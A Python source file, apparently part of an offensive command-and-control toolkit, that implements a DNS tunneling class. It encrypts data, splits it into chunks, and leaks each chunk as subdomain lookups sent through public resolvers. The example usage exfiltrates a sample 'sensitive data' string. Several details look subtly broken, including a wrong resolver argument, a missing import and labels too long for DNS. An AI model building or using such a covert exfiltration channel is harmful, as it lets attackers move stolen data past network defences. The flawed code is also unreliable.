# src/operators/c2_protocols/dns_tunneling.py
import dns.resolver
import os
import random
from cryptography.hazmat.primitives.ciphers.aead import AESGCM

class DNSTunnel:
    def __init__(self, domain="test.internal", key: bytes = None):
        self.nameservers = ["1.1.1.1", "8.8.8.8"]
        self.domain = domain
        self.subdomains = ["cdn", "api", "assets"]
        # Use provided key or generate a new 256-bit key.
        self.key = key or AESGCM.generate_key(bit_length=256)
        self.aesgcm = AESGCM(self.key)
        
    def _encrypt(self, data: bytes) -> str:
        """
        Encrypt data using AES-GCM with a random nonce.
        The nonce is prepended to the ciphertext.
        """
        nonce = os.urandom(12)  # 96-bit nonce for AES-GCM
        ct = self.aesgcm.encrypt(nonce, data, None)
        # For DNS, encode the combined nonce+ciphertext in base32 (without padding)
        from base64 import b32encode
        return b32encode(nonce + ct).decode().rstrip('=')
    
    def exfil(self, data: bytes, chunk_size=48):
        for i in range(0, len(data), chunk_size):
            sub = random.SystemRandom().choice(self.subdomains)
            host = f"{self._encrypt(data[i:i+chunk_size])}.{sub}.{self.domain}"
            try:
                dns.resolver.resolve(host, 'TXT', nameserver=random.choice(self.nameservers))
            except dns.exception.DNSException:
                pass

# Example usage:
if __name__ == "__main__":
    tunnel = DNSTunnel()
    tunnel.exfil(b"Sensitive data to exfiltrate via DNS tunneling.")
